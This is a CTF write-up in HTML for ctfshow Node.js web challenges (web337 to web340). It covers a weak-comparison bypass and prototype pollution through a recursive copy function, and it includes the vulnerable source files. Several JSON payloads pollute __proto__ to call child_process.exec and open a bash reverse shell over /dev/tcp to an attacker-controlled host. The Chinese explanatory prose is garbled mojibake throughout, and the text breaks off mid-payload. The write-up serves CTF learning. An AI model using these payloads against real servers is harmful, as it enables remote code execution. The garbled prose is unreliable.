res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„a,béƒ½æ˜¯åˆ©ç”¨getæ–¹æ³•è¿›è¡Œä¼ å‚ï¼Œä¸ç†è§£çš„nodejsä»£ç çš„å¯ä»¥çœ‹ä¸€ä¸‹ä¸‹é¢è¿™ç¯‡æ–‡ç« </p><p><a href="https://www.runoob.com/nodejs/node-js-get-post.html">nodejsçš„getå’Œpost</a></p><p>è¿™é‡Œçš„è¯æ˜¯nodejsçš„å¼±ç±»å‹æ¯”è¾ƒï¼Œç¬¬ä¸€æ¬¡è§</p><p>è§£é¢˜å…³é”®å°±åœ¨äºæ€ä¹ˆç»•è¿‡è¿™ä¸ªåˆ¤æ–­äº†ã€‚</p><p>è¿™é‡Œçš„æ€è·¯æ˜¯åˆ©ç”¨æ•°ç»„ç»•è¿‡ã€‚</p><p>nodejsçš„æ‹¼æ¥é—®é¢˜</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+<span class="number">6</span>); <span class="comment">//56</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>]); <span class="comment">//56,6</span></span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™å°±æœ‰ä¸€ç§æ€è·¯äº†ï¼Œå°±æ˜¯ç±»ä¼¼<code>[&#39;a&#39;]+flag===&#39;a&#39;+flag</code>è¿™æ ·çš„ï¼Œæ¯”å¦‚flagæ˜¯<code>flag&#123;123&#125;</code>ï¼Œé‚£ä¹ˆæœ€åå¾—åˆ°çš„éƒ½æ˜¯<code>aflag[123&#125;</code>ï¼Œå› æ­¤è¿™ä¸ªä¹Ÿè‚¯å®šæˆç«‹ï¼š<code>md5([&#39;a&#39;]+flag)===md5(&#39;a&#39;+flag)</code>ï¼ŒåŒæ—¶ä¹Ÿæ»¡è¶³<code>a!==b</code>ï¼š</p><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=<span class="number">1</span>&amp;b[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸ºäº†ç›¸ç­‰å°±æ˜¯å› ä¸ºè¦ä½¿md5åŠ å¯†ç›¸ç­‰</p><p><strong>è§£æ³•äºŒ</strong></p><p>è¿˜æœ‰ä¸€ç§æ€è·¯ã€‚ç†è§£ä¸€ä¸‹javascriptçš„æ•°ç»„ï¼Œä¼šå‘ç°å®ƒç›¸å¯¹æ¥è¯´ï¼Œå’Œpythonçš„åˆ—è¡¨æ›´ä¸ºç›¸åƒï¼Œè€Œä¸åƒphpçš„æ•°ç»„ï¼Œå› ä¸ºå®ƒåªèƒ½æ˜¯æ•°å­—ç´¢å¼•ï¼Œé‚£ä¹ˆå¦‚æœä¼ éæ•°å­—ç´¢å¼•å‘¢ï¼Ÿï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[x]=<span class="number">1</span>&amp;b[x]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>å˜æˆjavascriptä¸­çš„å¯¹è±¡äº†ã€‚è€Œå¯¹è±¡åˆæœ‰è¿™æ ·çš„ç‰¹ç‚¹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=&#123;</span><br><span class="line">    <span class="attr">x</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;123&#125;&quot;</span>)</span><br><span class="line"><span class="comment">//è¿”å›çš„æ˜¯ï¼š [object Object]flag&#123;123&#125;</span></span><br></pre></td></tr></table></figure><p>å› æ­¤ä¼ å…¥ä¸¤ä¸ªå¯¹è±¡ï¼Œè¿›è¡Œå˜é‡æ‹¼æ¥åå¾—åˆ°çš„éƒ½æ˜¯<strong>[object Object]ctfshow{xxxxxx}</strong>ï¼Œå†è¿›è¡Œmd5è‚¯å®šä¹Ÿæ˜¯ç›¸åŒçš„ã€‚æœ¬æ¥æˆ‘ä»¥ä¸ºè¿˜éœ€è¦è®©aå¯¹è±¡å’Œbå¯¹è±¡çš„æœ‰ä¸åŒçš„é”®æˆ–è€…è™½ç„¶é”®å…¨æ˜¯ç›¸åŒçš„ï¼Œä½†æ˜¯æœ‰å€¼ä¸åŒï¼Œè¿™æ ·æ¥æ»¡è¶³a!==bï¼Œä½†æ˜¯å‘ç°å¹¶ä¸éœ€è¦ï¼Œå› ä¸ºç”šè‡³è¿™æ ·ï¼Œè¿”å›çš„éƒ½æ˜¯falseï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=&#123;</span><br><span class="line">    <span class="attr">x</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b=&#123;</span><br><span class="line">    <span class="attr">x</span>:<span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a===b)</span><br><span class="line"><span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰è¿™éƒ¨åˆ†å°±å’Œjavaæœ‰ç‚¹åƒäº†ï¼Œä¸¤ä¸ªå¯¹è±¡ç›´æ¥æ¯”è¾ƒå¹¶ä¸æ˜¯è¯´æ¯”è¾ƒå±æ€§å•¥çš„ï¼Œè€Œæ˜¯é€šè¿‡å¼•ç”¨ï¼ˆå†…å­˜é‡Œçš„ä½ç½®ï¼‰æ¯”è¾ƒçš„ï¼Œå› æ­¤è‡ªç„¶a!==bã€‚<br>è¿™æ ·çš„è¯å€¼å°±å¯ä»¥ä¸ç›¸ç­‰äº†ï¼Œå› ä¸ºæœ€åè§£æéƒ½æ˜¯ä¼šè§£æ æˆ<strong>Object</strong></p><h2 id="web338-åŸé“¾æ±¡æŸ“"><a href="#web338-åŸé“¾æ±¡æŸ“" class="headerlink" title="web338(åŸé“¾æ±¡æŸ“)"></a>web338(åŸé“¾æ±¡æŸ“)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230130221831198.png" alt="image-20230130221831198"></p><p>å¯ä»¥çœ‹çœ‹pç¥å†™çš„æ–‡ç« </p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">è¿™ç¯‡</a></p><p>æºç é‡Œçš„ä¸œè¥¿</p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><strong>å…¶ä¸­è¿˜requireäº†ä¸€ä¸ªutils/common</strong></p><p>ç„¶åå°±å»æŸ¥çœ‹ä¸€ä¸‹ï¼Œ<strong>å‘ç°common.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">copy</span>:copy</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>é¡ºä¾¿åœ¨çœ‹çš„æ—¶å€™å‘ç°common.jså’ŒPç¥é‡Œé¢ä¸¾ä¾‹çš„JSå¯ä»¥è¯´æ˜¯ä¸€æ¨¡ä¸€æ ·</p><p>åªè¦secert.ctfshow===â€™36dboyâ€™å°±ä¼šæ‰“å°å‡ºflagã€‚è€ƒç‚¹æ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ï¼Œç¬¬ä¸€æ¬¡æ¥è§¦</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utils.copy(user,req.body);,è¿™é‡Œå°±æ˜¯çªç ´å£ï¼Œé€šè¿‡ç»™Objectæ·»åŠ ctfshowçš„å±æ€§ï¼Œä½¿ if(secert.ctfshow===&#x27;36dboy&#x27;)è¿”å›tureå³å¯</span><br></pre></td></tr></table></figure><p>å› ä¸ºcomment.jsä»£ç å°±æ˜¯nodejsæ±¡æŸ“</p><p><strong>payload</strong></p><p><img src="../images/image-20230130230002185.png" alt="image-20230130230002185"></p><h2 id="web339-æ¨¡æ¿æ¸²æŸ“rce-åŸå‹é“¾æ±¡æŸ“"><a href="#web339-æ¨¡æ¿æ¸²æŸ“rce-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="web339(æ¨¡æ¿æ¸²æŸ“rce åŸå‹é“¾æ±¡æŸ“)"></a>web339(æ¨¡æ¿æ¸²æŸ“rce åŸå‹é“¾æ±¡æŸ“)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230131203939821.png" alt="image-20230131203939821"></p><p><strong>åŸå‹é“¾æ±¡æŸ“éƒ½æ˜¯ä¾é ä¿®æ”¹objectä¸‹çš„å‚æ•°è¿›è¡Œæ±¡æŸ“ï¼Œè€Œåˆ›å»ºçš„å¯¹è±¡è¦æƒ³è¾¾åˆ°objectè¿™ä¸ªå¯¹è±¡çš„è¯ï¼Œå¾—ä½¿ç”¨proto</strong></p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">User</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">username</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">password</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">normalUser</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">user</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===flag)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æƒ³è¦æ˜¯<code>secert.ctfshow===flag</code>æ˜¯ä¸å¯èƒ½çš„äº‹ï¼Œé‚£æˆ‘ä»¬å°±åªèƒ½æƒ³åˆ«çš„åŠæ³•</p><p>è¿™é‡Œç»™çš„æºæ–‡ä»¶å¤šå‡ºä¸€ä¸ªapi.js</p><p><strong>api.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯æ˜¯åœ¨functionå‡½æ•°ä¸­çš„æ¨¡æ¿æ¸²æŸ“ï¼Œä¹Ÿæ˜¯å¯ä»¥åŒè¿‡åŸå‹é“¾æ±¡æŸ“queryè¿›è¡Œæ¨¡æ¿æ¸²æŸ“çš„rce</p><p>è¿™ä¸ªrenderå‡½æ•°å®é™…ä¸Šæ˜¯æ¸²æŸ“å‡½æ•°ï¼Œä¼šåœ¨å‡ºç°ç‰¹å®šè¯·æ±‚çš„æ—¶å€™æ‰§è¡Œç‰¹å®šæ“ä½œ</p><p>ç»è¿‡æµ‹è¯•ï¼Œqueryå‚æ•°çš„å€¼æ˜¯å¯ä»¥ç›´æ¥å½“åšè¯­å¥æ¥æ‰§è¡Œçš„</p><p>å…ˆ/loginé‚£é‡Œæ±¡æŸ“ä¸€ä¸‹å‘åŒ…ï¼Œç„¶åå†postè®¿é—®ä¸€ä¸‹/apiå³å¯ã€‚</p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/[vps-ip]/[port] 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>payloadä¸­ä¸ç”¨requireçš„åŸå› æ˜¯è¿™ä¸ªï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Functionç¯å¢ƒä¸‹æ²¡æœ‰requireå‡½æ•°ï¼Œä¸èƒ½è·å¾—child_processæ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨process.mainModule.constructor._loadæ¥ä»£æ›¿requireã€‚</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯å¾—åœ¨æœåŠ¡å™¨çš„é˜²ç«å¢™é‚£æ·»åŠ ç›‘å¬ç«¯å£ï¼Œä¸ç„¶ä¼šç›‘å¬ä¸æˆåŠŸã€‚</p><p><img src="../images/image-20230201184758003.png" alt="image-20230201184758003"></p><p>å¦‚æœç›‘å¬çš„æ˜¯9999ç«¯å£ï¼Œå°±æ–°å¼€ä¸€ä¸ª9999ç«¯å£ã€‚</p><p><strong>ç¬¬ä¸€æ­¥ï¼Œæ–°ç›‘å¬ä¸€ä¸ªç«¯å£</strong></p><p><img src="../images/image-20230201184938137.png" alt="image-20230201184938137"></p><p><strong>ç¬¬äºŒæ­¥**</strong>(åå¼¹shell)**</p><p>å…ˆ/loginé‚£é‡Œæ±¡æŸ“ä¸€ä¸‹å‘åŒ…ï¼Œç„¶åå†postè®¿é—®ä¸€ä¸‹/apiå³å¯ã€‚</p><p><img src="../images/image-20230201185729072.png" alt="image-20230201185729072"></p><p>æ–‡ä¸­æ ‡è®°çš„åœ°æ–¹è¦è®°å¾—ä¿®æ”¹</p><p><img src="../images/image-20230201185805509.png" alt="image-20230201185805509"></p><p><img src="../images/image-20230201185855177.png" alt="image-20230201185855177"></p><p>ç›‘å¬ç«¯å£å‡ºç°è¿™å°±ä»£è¡¨æˆåŠŸäº†ï¼Œè¿™é‡Œè®¿é—®apiçš„åŸå› æ˜¯ï¼Œå› ä¸ºåœ¨/logioné‡Œobjectç±»é‡Œä¿®æ”¹äº†queryçš„å€¼ï¼Œç„¶åè§¦å‘ç‚¹åœ¨/apiçš„ä»£ç é‡Œã€‚</p><p><strong>è§£æ³•äºŒ</strong></p><p>æ˜¯åˆ©ç”¨ejsçš„æ¨¡æ¿å¼•æ“æ¼æ´</p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>è§£æ³•æ­¥éª¤å’Œä¸Šé¢ä¸€æ ·ï¼Œæ˜¯å…ˆæ±¡æŸ“/loginï¼Œç„¶ååœ¨è®¿é—®api</p><h2 id="web340-ä¸¤å±‚æ±¡æŸ“"><a href="#web340-ä¸¤å±‚æ±¡æŸ“" class="headerlink" title="web340(ä¸¤å±‚æ±¡æŸ“)"></a>web340(ä¸¤å±‚æ±¡æŸ“)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230201190842269.png" alt="image-20230201190842269"></p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">   res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>api.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230201191036822.png" alt="image-20230201191036822"></p><p>å°±æ˜¯è¿™é‡Œçš„ä¸ä¸€æ ·ï¼Œè¿™é‡Œæƒ³è¦ä¿®æ”¹isAdminçš„å€¼çš„è¯ï¼Œå¾—è½¬åˆ°objectï¼Œå› ç»è¿‡æµ‹è¯•ï¼Œ<code>userinfo.__proto__.__proto__` æ‰æ˜¯ `Object</code> å¯¹è±¡ã€‚</p><p><img src="../images/image-20230201191809798.png" alt="image-20230201191809798"></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/111.11.111.11/11111 